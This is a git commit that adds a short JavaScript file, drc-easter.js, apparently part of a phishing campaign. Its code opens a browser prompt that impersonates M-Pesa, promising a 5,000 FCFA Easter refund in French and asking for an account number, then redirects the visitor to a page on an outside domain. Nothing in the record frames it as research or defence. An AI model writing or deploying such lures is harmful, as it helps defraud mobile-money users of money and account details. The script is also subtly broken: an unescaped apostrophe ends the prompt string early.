b049a84ed710087b0c082b648b2f7447db67241d
mfednewblog8 <nsikakimoh68@gmail.com>
2026-04-02 09:35:36 +0100

    Create drc-easter.js

---
+++ drc-easter.js
@@ -0,0 +1,5 @@
+var password = 'Retirer 5 000 FC'
+password=prompt('M-Pesa: Félicitations, vous êtes éligible à l'offre de remboursement de Pâques de 5 000 FCFA de M-Pesa. Cliquez sur OK pour saisir votre numéro de compte.','Retirer 5 000 FC');
+if (password != 'Retirer 5 000 FC') {
+location.href='https://ibaidad.com/m-pesa-esater.html';
+}
